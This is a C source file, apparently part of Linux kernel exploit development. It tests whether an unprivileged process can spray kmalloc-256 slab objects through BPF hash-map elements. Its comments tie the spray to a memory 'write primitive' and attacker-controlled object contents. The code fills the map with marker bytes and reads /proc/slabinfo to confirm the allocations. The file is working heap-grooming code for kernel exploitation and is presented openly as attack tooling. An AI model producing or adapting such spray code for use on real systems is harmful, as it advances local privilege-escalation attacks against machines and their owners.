/*
 * bpf_probe.c - can an unprivileged shell process use BPF maps as an order-1
 * (256-byte object) spray?
 *
 * A BPF_MAP_TYPE_HASH with a small key and a tuned value size allocates one
 * htab_elem per inserted key:
 *     htab_elem header (~56 B) + key(8 B) + value(value_size) -> kmalloc bucket
 * With value_size ~ 192 that is a 256-byte object, and kmalloc-256 has
 * pagesperslab == 2, i.e. exactly the order-1 slab the write primitive needs.
 * Element contents are fully attacker controlled and persist until deleted.
 *
 * usage: bpf_probe <value_size> <count>
 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/bpf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

static int bpf(int cmd, union bpf_attr *attr)
{
    return (int)syscall(280 /* bpf */, cmd, attr, sizeof(*attr));
}

static void snap(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "re");
    char line[256];
    const char *c[] = { "kmalloc-256", "kmalloc-512", "kmalloc-192", NULL };
    printf("--- %s ---\n", tag);
    if (!f) { printf("  unreadable\n"); return; }
    while (fgets(line, sizeof line, f))
        for (int i = 0; c[i]; i++) {
            size_t n = strlen(c[i]);
            if (!strncmp(line, c[i], n) && line[n] == ' ') { printf("  %s", line); break; }
        }
    fclose(f);
}

int main(int argc, char **argv)
{
    int vsz = argc > 1 ? atoi(argv[1]) : 192;
    int N   = argc > 2 ? atoi(argv[2]) : 2000;

    snap("before");

    union bpf_attr a;
    memset(&a, 0, sizeof a);
    a.map_type = BPF_MAP_TYPE_HASH;
    a.key_size = 8;
    a.value_size = (unsigned)vsz;
    a.max_entries = (unsigned)N;
    int fd = bpf(BPF_MAP_CREATE, &a);
    if (fd < 0) {
        printf("BPF_MAP_CREATE failed: errno=%d (%s)\n", errno, strerror(errno));
        return 1;
    }
    printf("map created fd=%d value_size=%d max_entries=%d\n", fd, vsz, N);

    unsigned char *val = malloc(vsz);
    memset(val, 0x41, vsz);
    int made = 0;
    for (int i = 0; i < N; i++) {
        long long key = i;
        memset(&a, 0, sizeof a);
        a.map_fd = (unsigned)fd;
        a.key = (unsigned long long)(unsigned long)&key;
        a.value = (unsigned long long)(unsigned long)val;
        a.flags = BPF_ANY;
        if (bpf(BPF_MAP_UPDATE_ELEM, &a) != 0) {
            printf("update stopped at %d: errno=%d (%s)\n", i, errno, strerror(errno));
            break;
        }
        made++;
    }
    snap("after insert");
    printf("inserted %d elements of %d B\n", made, vsz);
    printf("want: kmalloc-256 active_objs to rise by ~%d\n", made);
    return 0;
}
